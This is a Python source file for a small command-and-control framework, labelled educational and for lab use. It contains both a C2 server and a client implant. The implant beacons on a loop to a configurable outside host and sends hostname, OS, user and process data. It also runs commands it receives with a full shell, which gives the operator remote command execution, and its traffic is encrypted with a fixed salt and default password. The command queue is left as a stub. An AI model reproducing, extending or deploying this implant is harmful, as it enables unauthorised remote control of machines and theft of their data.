#!/usr/bin/env python3
"""
C2 Mini Framework - Python Implementation
Educational purpose only - Lab environment use
"""

import socket
import threading
import json
import base64
import hashlib
import time
import os
import sys
import argparse
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444, password='changeme123'):
        self.host = host
        self.port = port
        self.password = password
        self.clients = {}
        self.encryption_key = self.generate_encryption_key(password)
        self.fernet = Fernet(self.encryption_key)
        
    def generate_encryption_key(self, password):
        """Generate encryption key from password"""
        password_bytes = password.encode()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'C2_Framework_Salt',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password_bytes))
        return key
    
    def encrypt_message(self, message):
        """Encrypt message before sending"""
        if isinstance(message, dict):
            message = json.dumps(message)
        encrypted = self.fernet.encrypt(message.encode())
        return base64.urlsafe_b64encode(encrypted).decode()
    
    def decrypt_message(self, encrypted_message):
        """Decrypt received message"""
        try:
            encrypted_bytes = base64.urlsafe_b64decode(encrypted_message.encode())
            decrypted = self.fernet.decrypt(encrypted_bytes)
            return json.loads(decrypted.decode())
        except:
            return {"error": "Decryption failed"}
    
    def handle_client(self, client_socket, client_address):
        """Handle individual client connections"""
        print(f"[+] New connection from {client_address}")
        client_id = hashlib.md5(str(client_address).encode()).hexdigest()[:8]
        
        # Add client to registry
        self.clients[client_id] = {
            'socket': client_socket,
            'address': client_address,
            'last_seen': time.time(),
            'info': {}
        }
        
        try:
            while True:
                # Receive encrypted data
                data = client_socket.recv(4096).decode().strip()
                if not data:
                    break
                
                # Decrypt and process message
                decrypted = self.decrypt_message(data)
                print(f"[*] Received from {client_id}: {decrypted}")
                
                # Update client info
                if 'system_info' in decrypted:
                    self.clients[client_id]['info'] = decrypted['system_info']
                    self.clients[client_id]['last_seen'] = time.time()
                
                # Send heartbeat response or command
                response = self.process_command(decrypted, client_id)
                encrypted_response = self.encrypt_message(response)
                client_socket.send(encrypted_response.encode())
                
        except Exception as e:
            print(f"[-] Error with client {client_id}: {e}")
        finally:
            del self.clients[client_id]
            client_socket.close()
            print(f"[-] Client {client_id} disconnected")
    
    def process_command(self, data, client_id):
        """Process incoming data and return appropriate response"""
        if data.get('type') == 'checkin':
            return {
                'status': 'active',
                'command': 'idle',
                'timestamp': time.time()
            }
        elif data.get('type') == 'result':
            print(f"[+] Command result from {client_id}: {data.get('output', 'No output')}")
            return {'status': 'result_received'}
        else:
            # Check if we have a pending command for this client
            return self.get_pending_command(client_id)
    
    def get_pending_command(self, client_id):
        """Get next command for client (simplified)"""
        # In a real implementation, this would check a command queue
        return {
            'status': 'active',
            'command': 'idle',
            'timestamp': time.time()
        }
    
    def send_command(self, client_id, command, args=None):
        """Send command to specific client"""
        if client_id in self.clients:
            command_data = {
                'type': 'execute',
                'command': command,
                'args': args or [],
                'timestamp': time.time()
            }
            
            # Store command for client to retrieve
            # In full implementation, this would use a queue
            print(f"[*] Sent command to {client_id}: {command}")
            return True
        return False
    
    def list_clients(self):
        """List all connected clients"""
        print("\n[*] Connected Clients:")
        print("-" * 50)
        for client_id, client_info in self.clients.items():
            uptime = time.time() - client_info['last_seen']
            print(f"ID: {client_id} | Address: {client_info['address']} | Uptime: {uptime:.1f}s")
            if client_info['info']:
                print(f"     Info: {client_info['info']}")
        print("-" * 50)
    
    def start_server(self):
        """Start the C2 server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(5)
            print(f"[*] C2 Server listening on {self.host}:{self.port}")
            print("[*] Waiting for client connections...")
            
            while True:
                client_socket, client_address = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            server.close()

class C2Client:
    def __init__(self, server_host, server_port=4444, password='changeme123'):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self.encryption_key = self.generate_encryption_key(password)
        self.fernet = Fernet(self.encryption_key)
        self.client_id = hashlib.md5(os.urandom(8)).hexdigest()[:8]
    
    def generate_encryption_key(self, password):
        """Generate encryption key from password (must match server)"""
        password_bytes = password.encode()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'C2_Framework_Salt',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password_bytes))
        return key
    
    def encrypt_message(self, message):
        """Encrypt message before sending"""
        if isinstance(message, dict):
            message = json.dumps(message)
        encrypted = self.fernet.encrypt(message.encode())
        return base64.urlsafe_b64encode(encrypted).decode()
    
    def decrypt_message(self, encrypted_message):
        """Decrypt received message"""
        try:
            encrypted_bytes = base64.urlsafe_b64decode(encrypted_message.encode())
            decrypted = self.fernet.decrypt(encrypted_bytes)
            return json.loads(decrypted.decode())
        except:
            return {"error": "Decryption failed"}
    
    def get_system_info(self):
        """Gather basic system information"""
        try:
            import platform
            info = {
                'hostname': platform.node(),
                'os': platform.system(),
                'version': platform.version(),
                'arch': platform.machine(),
                'user': os.getenv('USER') or os.getenv('USERNAME'),
                'pid': os.getpid()
            }
            return info
        except:
            return {'hostname': 'unknown', 'os': 'unknown'}
    
    def execute_command(self, command, args):
        """Execute received command"""
        try:
            if command == 'idle':
                return {'status': 'success', 'output': 'Idling'}
            elif command == 'system_info':
                info = self.get_system_info()
                return {'status': 'success', 'output': info}
            elif command == 'execute':
                # Execute system command (limited for safety)
                if args and len(args) > 0:
                    import subprocess
                    result = subprocess.run(args, capture_output=True, text=True, shell=True)
                    return {
                        'status': 'success',
                        'output': result.stdout,
                        'error': result.stderr,
                        'returncode': result.returncode
                    }
                else:
                    return {'status': 'error', 'output': 'No command provided'}
            else:
                return {'status': 'error', 'output': f'Unknown command: {command}'}
        except Exception as e:
            return {'status': 'error', 'output': str(e)}
    
    def beacon(self):
        """Send beacon to C2 server"""
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.server_host, self.server_port))
            
            # Send initial checkin
            checkin_data = {
                'type': 'checkin',
                'client_id': self.client_id,
                'system_info': self.get_system_info(),
                'timestamp': time.time()
            }
            
            encrypted_checkin = self.encrypt_message(checkin_data)
            sock.send(encrypted_checkin.encode())
            
            # Receive and process command
            response = sock.recv(4096).decode().strip()
            if response:
                decrypted_response = self.decrypt_message(response)
                
                # Execute command if received
                if decrypted_response.get('command') != 'idle':
                    command_result = self.execute_command(
                        decrypted_response.get('command'),
                        decrypted_response.get('args', [])
                    )
                    
                    # Send result back
                    result_data = {
                        'type': 'result',
                        'client_id': self.client_id,
                        'result': command_result,
                        'timestamp': time.time()
                    }
                    
                    encrypted_result = self.encrypt_message(result_data)
                    sock.send(encrypted_result.encode())
            
            sock.close()
            return True
            
        except Exception as e:
            print(f"[-] Beacon failed: {e}")
            return False
    
    def start_client(self, interval=60):
        """Start client beaconing loop"""
        print(f"[*] Client {self.client_id} starting...")
        print(f"[*] Connecting to {self.server_host}:{self.server_port}")
        
        while True:
            try:
                success = self.beacon()
                if not success:
                    print("[-] Beacon failed, retrying in 30 seconds")
                    time.sleep(30)
                else:
                    print(f"[+] Beacon successful, waiting {interval}s")
                    time.sleep(interval)
            except KeyboardInterrupt:
                print("\n[*] Client shutting down...")
                break
            except Exception as e:
                print(f"[-] Client error: {e}")
                time.sleep(30)

def main():
    parser = argparse.ArgumentParser(description='C2 Mini Framework')
    parser.add_argument('--mode', choices=['server', 'client'], required=True,
                       help='Operation mode')
    parser.add_argument('--host', default='0.0.0.0',
                       help='Server host (for server mode)')
    parser.add_argument('--port', type=int, default=4444,
                       help='Server port')
    parser.add_argument('--password', default='changeme123',
                       help='Encryption password')
    parser.add_argument('--server-host', 
                       help='Server host (for client mode)')
    
    args = parser.parse_args()
    
    if args.mode == 'server':
        server = C2Server(args.host, args.port, args.password)
        server.start_server()
    else:
        if not args.server_host:
            print("[-] Must specify --server-host for client mode")
            return
        client = C2Client(args.server_host, args.port, args.password)
        client.start_client()

if __name__ == "__main__":
    main()
